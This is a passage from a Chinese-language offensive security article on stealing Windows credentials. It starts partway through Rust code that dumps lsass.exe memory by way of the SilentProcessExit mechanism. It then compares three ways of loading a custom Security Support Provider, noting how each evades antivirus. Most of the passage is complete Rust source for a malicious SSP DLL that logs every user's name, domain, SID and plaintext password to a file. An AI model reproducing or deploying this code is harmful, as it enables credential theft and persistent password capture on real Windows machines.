            println!("[-] SetReportingModekeyKey SilentProcessExit\\lsass.exe ERROR\n");
        }
        println!("SetRegistryReg successful!");
    }
}

fn main() {
    let matches = App::new("SysWhispers3 - SysWhispers on steroids")
    .arg(Arg::with_name("DumpFileName")
        .short("f")
        .long("DumpFileName")
        .takes_value(true)
        .help("DumpFileName Path like C:\\temp.dmp")).get_matches();
    let mut out_file = "";
    if   matches.is_present("DumpFileName") {
        out_file = matches.value_of("DumpFileName").expect("get DumpFileName args error");
    }else {
        out_file = "lsass.dmp";
    }
    // getProcess(out_file);
    getPrivilege(unsafe { GetCurrentProcess() });
    setRegisterRegs();
    let lsassPid = getPid("lsass.exe");
    let process_handle = unsafe { OpenProcess(PROCESS_ALL_ACCESS, 0, lsassPid) };
    if process_handle == 0 {
        println!("Fail to open the Lsassprocess ");
    }
    unsafe{
        let ntdll_module_name: Vec<u16> = OsStr::new("ntdll.dll").encode_wide().chain(Some(0).into_iter()).collect();
        let h_nt_mod =  GetModuleHandleW(ntdll_module_name.as_ptr());

        if h_nt_mod ==0 {
            println!(" - 获取NTDLL模块句柄失败");

        }
        let function_name = CString::new("RtlReportSilentProcessExit").unwrap();

        let FnRtlreportSilentProcessExit  = GetProcAddress(
            h_nt_mod, 
            function_name.as_ptr() as *const u8).expect("") ;
        let fn_rtl_report_silent_process_exit : FnRtlreportSilentProcessExit = transmute(FnRtlreportSilentProcessExit);
        let desired_access = PROCESS_QUERY_LIMITED_INFORMATION | PROCESS_VM_READ;
        let h_lsass_proc = OpenProcess(desired_access, 0, lsassPid);
        if h_lsass_proc == 0 {
            println!("[+] 获取lsass进程句柄失败: {:X}", GetLastError());
        }
        println!("[+] Got {:?} PID: {:?}","lsass.exe",lsassPid as u32);

        let ntstatus = fn_rtl_report_silent_process_exit(h_lsass_proc,0);
        if ntstatus == 0{
            println!("[+] DumpLsass Successful and file is c:\\temp\\lsass*.dmp...RET CODE : %#X\n");
        }else {
            println!("FnRtlreportSilentProcessExit error!");
        }
    }

}

```

添加自定义的SSP
---------

> SSP（Security Support Provider）是windows操作系统安全机制的提供者。简单的说，SSP就是DLL文件，主要用于windows操作系统的身份认证功能，例如NTLM、Kerberos、Negotiate、Secure Channel（Schannel）、Digest、Credential（CredSSP）。  
> SSPI（Security Support Provider Interface，安全支持提供程序接口）是windows操作系统在执行认证操作时使用的API接口。可以说SSPI就是SSP的API接口。

官方解释  
![](images/attach-f4621f13f569e0edfda795b51eb5225a81f0b24a.png)  
在windowsw中lsass.exe和winlogin.exe进程是用来管理登录的两个进程，都包含在LSA(Local Security Authority)里面，它主要是负责运行windows系统安全策略。SSP在windows启动之后，会被加载到lsass.exe进程中，所以关于SSP的用户密码窃取一般是下面几种方法。

(1) 使用MemSSP对lsass进行patch

> 优点：
> 
> - 不需要重启服务器
> - Lsass进程中不会出现可疑的DLL  
>     缺点：
> - 需要调用WriteProcessMemory对lsass进行操作，可能会被标记

(2) 使用AddSecurityPackage加载SSP

> 优点：
> 
> - 可以绕过部分杀软对lsass的监控
> - 可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况
> - 不需要重启服务器  
>     缺点：
> - 需要写注册表
> - 需要将SSP的dll拷贝到system32下
> - Blue Team可以通过枚举SSP来发现我们自定义的SSP，并且lsass进程中可以看到加载的DLL

(3) 通过RPC加载SSP

优点：

> - 可以绕过杀软对lsass的监控
> - 可以加载mimilib来记录密码以应对版本大于等于Windows Server 2012的情况
> - 不需要重启服务器
> - 不需要写注册表  
>     缺点：
> - 因为没有写注册表，所以无法持久化，如果目标机器重启的话将无法记录密码（因此个人认为比较适合在Server上用，不适合在PC上用）

这里用rust对三种方法都进行一个实现，暂且实现了AddSecurityPackage方法，后续github持续更新。一些基础知识可以看msdn-><https://learn.microsoft.com/zh-cn/windows/win32/secauthn/lsa-mode-initialization>

### 使用AddSecurityPackage加载SSP

完整代码在 <https://github.com/haoami/RustSSPdumpHash>  
lib如下

```rust
use std::{os::{windows::prelude::{FileExt, OsStringExt, OsStrExt}, raw::c_void}, io::Write, slice, ffi::{OsString, CString}, fs::File};
use windows::{
    Win32::{
        Security::{
            Authentication::Identity::{ 
                SECPKG_PARAMETERS, LSA_SECPKG_FUNCTION_TABLE, SECPKG_FLAG_ACCEPT_WIN32_NAME, SECPKG_FLAG_CONNECTION, SECURITY_LOGON_TYPE, LSA_UNICODE_STRING, SECPKG_PRIMARY_CRED, SECPKG_SUPPLEMENTAL_CRED, SECPKG_INTERFACE_VERSION, SecPkgInfoW, PLSA_AP_INITIALIZE_PACKAGE, PLSA_AP_LOGON_USER, PLSA_AP_CALL_PACKAGE, PLSA_AP_LOGON_TERMINATED, PLSA_AP_CALL_PACKAGE_PASSTHROUGH, PLSA_AP_LOGON_USER_EX, PLSA_AP_LOGON_USER_EX2, SpShutdownFn, SpInitializeFn, SpAcceptCredentialsFn, SpAcquireCredentialsHandleFn, SpFreeCredentialsHandleFn, LSA_AP_POST_LOGON_USER, SpExtractTargetInfoFn, PLSA_AP_POST_LOGON_USER_SURROGATE, PLSA_AP_PRE_LOGON_USER_SURROGATE, PLSA_AP_LOGON_USER_EX3, SpGetTbalSupplementalCredsFn, SpGetRemoteCredGuardSupplementalCredsFn, SpGetRemoteCredGuardLogonBufferFn, SpValidateTargetInfoFn, SpUpdateCredentialsFn, SpGetCredUIContextFn, SpExchangeMetaDataFn, SpQueryMetaDataFn, SpChangeAccountPasswordFn, SpSetCredentialsAttributesFn, SpSetContextAttributesFn, SpSetExtendedInformationFn, SpAddCredentialsFn, SpQueryContextAttributesFn, SpGetExtendedInformationFn, SpGetUserInfoFn, SpApplyControlTokenFn, SpDeleteContextFn, SpAcceptLsaModeContextFn, SpInitLsaModeContextFn, SpDeleteCredentialsFn, SpGetCredentialsFn, SpSaveCredentialsFn, SpQueryCredentialsAttributesFn}, Authorization::ConvertSidToStringSidW
            }, 
            Foundation::{NTSTATUS, STATUS_SUCCESS, PSID}
        }, core::PWSTR
    };
use windows::core::Result;
use windows::core::Error;

pub type SpGetInfoFn = ::core::option::Option<unsafe extern "system" fn(packageinfo: *mut SecPkgInfoW) -> NTSTATUS>;

#[repr(C)]
pub struct SECPKG_FUNCTION_TABLE {
    pub InitializePackage: PLSA_AP_INITIALIZE_PACKAGE,
    pub LogonUserA: PLSA_AP_LOGON_USER,
    pub CallPackage: PLSA_AP_CALL_PACKAGE,
    pub LogonTerminated: PLSA_AP_LOGON_TERMINATED,
    pub CallPackageUntrusted: PLSA_AP_CALL_PACKAGE,
    pub CallPackagePassthrough: PLSA_AP_CALL_PACKAGE_PASSTHROUGH,
    pub LogonUserExA: PLSA_AP_LOGON_USER_EX,
    pub LogonUserEx2: PLSA_AP_LOGON_USER_EX2,
    pub Initialize: SpInitializeFn,
    pub Shutdown: SpShutdownFn,
    pub GetInfo: SpGetInfoFn,
    pub AcceptCredentials: SpAcceptCredentialsFn,
    pub AcquireCredentialsHandleA: SpAcquireCredentialsHandleFn,
    pub QueryCredentialsAttributesA: SpQueryCredentialsAttributesFn,
    pub FreeCredentialsHandle: SpFreeCredentialsHandleFn,
    pub SaveCredentials: SpSaveCredentialsFn,
    pub GetCredentials: SpGetCredentialsFn,
    pub DeleteCredentials: SpDeleteCredentialsFn,
    pub InitLsaModeContext: SpInitLsaModeContextFn,
    pub AcceptLsaModeContext: SpAcceptLsaModeContextFn,
    pub DeleteContext: SpDeleteContextFn,
    pub ApplyControlToken: SpApplyControlTokenFn,
    pub GetUserInfo: SpGetUserInfoFn,
    pub GetExtendedInformation: SpGetExtendedInformationFn,
    pub QueryContextAttributesA: SpQueryContextAttributesFn,
    pub AddCredentialsA: SpAddCredentialsFn,
    pub SetExtendedInformation: SpSetExtendedInformationFn,
    pub SetContextAttributesA: SpSetContextAttributesFn,
    pub SetCredentialsAttributesA: SpSetCredentialsAttributesFn,
    pub ChangeAccountPasswordA: SpChangeAccountPasswordFn,
    pub QueryMetaData: SpQueryMetaDataFn,
    pub ExchangeMetaData: SpExchangeMetaDataFn,
    pub GetCredUIContext: SpGetCredUIContextFn,
    pub UpdateCredentials: SpUpdateCredentialsFn,
    pub ValidateTargetInfo: SpValidateTargetInfoFn,
    pub PostLogonUser: LSA_AP_POST_LOGON_USER,
    pub GetRemoteCredGuardLogonBuffer: SpGetRemoteCredGuardLogonBufferFn,
    pub GetRemoteCredGuardSupplementalCreds: SpGetRemoteCredGuardSupplementalCredsFn,
    pub GetTbalSupplementalCreds: SpGetTbalSupplementalCredsFn,
    pub LogonUserEx3: PLSA_AP_LOGON_USER_EX3,
    pub PreLogonUserSurrogate: PLSA_AP_PRE_LOGON_USER_SURROGATE,
    pub PostLogonUserSurrogate: PLSA_AP_POST_LOGON_USER_SURROGATE,
    pub ExtractTargetInfo: SpExtractTargetInfoFn,
}
const SecPkgFunctionTable : SECPKG_FUNCTION_TABLE= SECPKG_FUNCTION_TABLE{
    InitializePackage: None , 
    LogonUserA: None ,
    CallPackage: None,
    LogonTerminated: None,
    CallPackageUntrusted: None,
    CallPackagePassthrough: None,
    LogonUserExA: None,
    LogonUserEx2: None,
    Initialize: Some(_SpInitialize),
    Shutdown: Some(_SpShutDown),
    GetInfo: Some(_SpGetInfo),
    AcceptCredentials: Some(_SpAcceptCredentials),
    AcquireCredentialsHandleA: None,
    QueryCredentialsAttributesA: None,
    FreeCredentialsHandle: None,
    SaveCredentials: None,
    GetCredentials: None,
    DeleteCredentials: None,
    InitLsaModeContext: None,
    AcceptLsaModeContext: None,
    DeleteContext: None,
    ApplyControlToken: None,
    GetUserInfo: None,
    GetExtendedInformation: None,
    QueryContextAttributesA: None,
    AddCredentialsA: None,
    SetExtendedInformation: None,
    SetContextAttributesA: None,
    SetCredentialsAttributesA: None,
    ChangeAccountPasswordA: None,
    QueryMetaData: None,
    ExchangeMetaData: None,
    GetCredUIContext: None,
    UpdateCredentials: None,
    ValidateTargetInfo: None,
    PostLogonUser: None,
    GetRemoteCredGuardLogonBuffer: None,
    GetRemoteCredGuardSupplementalCreds: None,
    GetTbalSupplementalCreds: None,
    LogonUserEx3: None,
    PreLogonUserSurrogate: None,
    PostLogonUserSurrogate: None,
    ExtractTargetInfo: None,
};

#[no_mangle]
pub unsafe extern "system" fn _SpGetInfo(packageinfo: *mut SecPkgInfoW) -> NTSTATUS {
    (*packageinfo).fCapabilities = SECPKG_FLAG_ACCEPT_WIN32_NAME | SECPKG_FLAG_CONNECTION;
    (*packageinfo).wVersion = 1;
    (*packageinfo).wRPCID = 0; 
    (*packageinfo).cbMaxToken = 0;
    let name = OsString::from("Kerberos").encode_wide().chain(Some(0)).collect::<Vec<_>>().as_ptr();
    let Comment= OsString::from("Kerberos v1.0").encode_wide().chain(Some(0)).collect::<Vec<_>>().as_ptr();
    (*packageinfo).Name = name as *mut u16;
    (*packageinfo).Comment = Comment as *mut u16;
    STATUS_SUCCESS
}

#[no_mangle]
pub unsafe extern "system" fn _SpShutDown() -> NTSTATUS {
    STATUS_SUCCESS
}
#[no_mangle]
pub unsafe extern "system" fn _SpInitialize(
        packageid: usize,
        parameters: *const SECPKG_PARAMETERS,
        functiontable: *const LSA_SECPKG_FUNCTION_TABLE,
    ) -> NTSTATUS {
        STATUS_SUCCESS
    }
pub fn lsa_unicode_string_to_string(lsa_us: &LSA_UNICODE_STRING) -> String {
        let slice = unsafe { slice::from_raw_parts(lsa_us.Buffer.0 as *const u16, lsa_us.Length as usize / 2) };
        let os_string = OsString::from_wide(slice);
        os_string.into_string().unwrap()
}
#[no_mangle]
pub unsafe extern "system" fn _SpAcceptCredentials(
        logontype: SECURITY_LOGON_TYPE,
        accountname: *const LSA_UNICODE_STRING,
        primarycredentials: *const SECPKG_PRIMARY_CRED,
        supplementalcredentials: *const SECPKG_SUPPLEMENTAL_CRED,
    ) -> NTSTATUS {
        let mut logfile = File::create("C:\\temp.log").expect("");
        logfile.write_all(">>>>\n".as_bytes()).expect("CustSSP.log write failed");
        writeln!(
            logfile,
            "[+] Authentication Id : {}:{} ({:08x}:{:08x})",
            (*primarycredentials).LogonId.HighPart,
            (*primarycredentials).LogonId.LowPart,
            (*primarycredentials).LogonId.HighPart,
            (*primarycredentials).LogonId.LowPart,
        ).unwrap();
        let logon_type_str = match logontype {
            SECURITY_LOGON_TYPE::UndefinedLogonType => "UndefinedLogonType",
            SECURITY_LOGON_TYPE::Interactive => "Interactive",
            SECURITY_LOGON_TYPE::Network => "Network",
            SECURITY_LOGON_TYPE::Batch => "Batch",
            SECURITY_LOGON_TYPE::Service => "Service",
            SECURITY_LOGON_TYPE::Proxy => "Proxy",
            SECURITY_LOGON_TYPE::Unlock => "Unlock",
            SECURITY_LOGON_TYPE::NetworkCleartext => "NetworkCleartext",
            SECURITY_LOGON_TYPE::NewCredentials => "NewCredentials",
            SECURITY_LOGON_TYPE::RemoteInteractive => "RemoteInteractive",
            SECURITY_LOGON_TYPE::CachedInteractive => "CachedInteractive",
            SECURITY_LOGON_TYPE::CachedRemoteInteractive => "CachedRemoteInteractive",
            SECURITY_LOGON_TYPE::CachedUnlock => "CachedUnlock",
            _ => "Unknown !"
        };
        writeln!(logfile, "[+] Logon Type        : {}", logon_type_str).unwrap();
        writeln!(logfile, "[+] User Name         : {:?}", accountname);
        writeln!(logfile, "[+] * Domain   : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).DomainName));
        writeln!(logfile, "[+] * Logon Server     : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).LogonServer));
        writeln!(logfile, "[+] * SID     : {:?}", convert_sid_to_string((*primarycredentials).UserSid));
        writeln!(logfile, "[+] * UserName   : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).DownlevelName));
        writeln!(logfile, "[+] * Password       : {:?}", lsa_unicode_string_to_string(&(*primarycredentials).Password));
        drop(logfile);
        STATUS_SUCCESS
    }

#[no_mangle]
pub fn convert_sid_to_string(sid: PSID) -> Result<String> {
        let mut sid_string_ptr: PWSTR = windows::core::PWSTR(std::ptr::null_mut());
        let result = unsafe { ConvertSidToStringSidW(sid, &mut sid_string_ptr) };
        if result.is_ok() {
            let sid_string = unsafe { get_string_from_pwstr(sid_string_ptr) };
            Ok(sid_string)
        } else {
            Err(Error::from_win32())
        }
    }

#[no_mangle]
pub unsafe fn get_string_from_pwstr(pwstr: PWSTR) -> String {
        let len = (0..).take_while(|&i| *pwstr.0.offset(i) != 0).count();
        let slice = std::slice::from_raw_parts(pwstr.0 as *const u16, len);
        String::from_utf16_lossy(slice)
    }

#[no_mangle]
pub unsafe extern "system" fn SpLsaModeInitialize(
    LsaVersion: u32,
    PackageVersion: *mut u32,
    ppTables: *mut *const SECPKG_FUNCTION_TABLE,
    pcTables: *mut u32,
) -> NTSTATUS {
    *PackageVersion = SECPKG_INTERFACE_VERSION ;
    *ppTables = &SecPkgFunctionTable;
    *pcTables = 1 as u32;
    STATUS_SUCCESS
}
```

![](images/attach-c2f2e58221bc10f7dd27e0009c23ba2b2721474a.png)

参考文章  
<https://lengjibo.github.io/lassdump/>  
<https://xz.aliyun.com/t/12157#toc-10>  
<https://www.crisprx.top/archives/469>  
<https://3gstudent.github.io/%E6%B8%97%E9%80%8F%E5%9F%BA%E7%A1%80-%E8%BF%9C%E7%A8%8B%E4%BB%8Elsass.exe%E8%BF%9B%E7%A8%8B%E5%AF%BC%E5%87%BA%E5%87%AD%E6%8D%AE>  
<https://www.freebuf.com/sectool/226170.html>  
<https://xz.aliyun.com/t/12157#toc-4>  
<https://cloud.tencent.com/developer/article/2103172>  
<https://mrwu.red/web/2000.html>  
<https://www.wangan.com/p/11v72bf602eabeb6#SpAcceptCredentials>  
<https://loong716.top/posts/lsass/#4-x86%E7%8E%AF%E5%A2%83%E4%B8%8B%E5%88%A9%E7%94%A8rpc%E5%8A%A0%E8%BD%BDssp>  
<https://xz.aliyun.com/t/8323>  
<https://drunkmars.top/2021/12/05/%E6%B3%A8%E5%85%A5SSP/>  
<https://blog.xpnsec.com/exploring-mimikatz-part-2/>  
<https://www.wangan.com/p/11v72bf602eabeb6>  
<https://github.com/haoami/RustSSPdumpHash>
